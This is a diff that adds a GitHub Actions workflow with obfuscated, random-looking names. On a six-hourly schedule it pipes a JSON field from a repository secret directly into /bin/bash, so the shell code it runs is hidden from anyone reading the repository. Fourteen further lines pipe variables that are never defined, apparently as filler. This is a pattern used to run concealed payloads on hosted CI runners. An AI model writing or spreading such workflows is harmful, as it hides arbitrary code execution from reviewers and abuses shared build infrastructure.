@@ -1,0 +1,30 @@
+name: yunchengzhu6758
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yunchengzhu6758
+        env:
+          vgo149: ${{ secrets.vgo149 }}
+        run: |
+          echo $vgo149 | jq -r .ugbrr1602 | /bin/bash
+          echo $drjuf9925 | jq -r .rmzsx8034 | /bin/bash
+          echo $bvj6189 | jq -r .ru73 | /bin/bash
+          echo $bts6735 | jq -r .le31 | /bin/bash
+          echo $npklb8238 | jq -r .git955 | /bin/bash
+          echo $jqvkz60772 | jq -r .obr080 | /bin/bash
+          echo $csg8 | jq -r .ikal31 | /bin/bash
+          echo $d387 | jq -r .fv74 | /bin/bash
+          echo $vf8820 | jq -r .ieo215 | /bin/bash
+          echo $om204 | jq -r .fpg6 | /bin/bash
+          echo $ejws26471 | jq -r .mqnw27633 | /bin/bash
+          echo $dslk481 | jq -r .d3 | /bin/bash
+          echo $pnoir46 | jq -r .ihz964 | /bin/bash
+          echo $qmhyy862 | jq -r .ie0607 | /bin/bash
+          echo $wpz58 | jq -r .nya7095 | /bin/bash
+
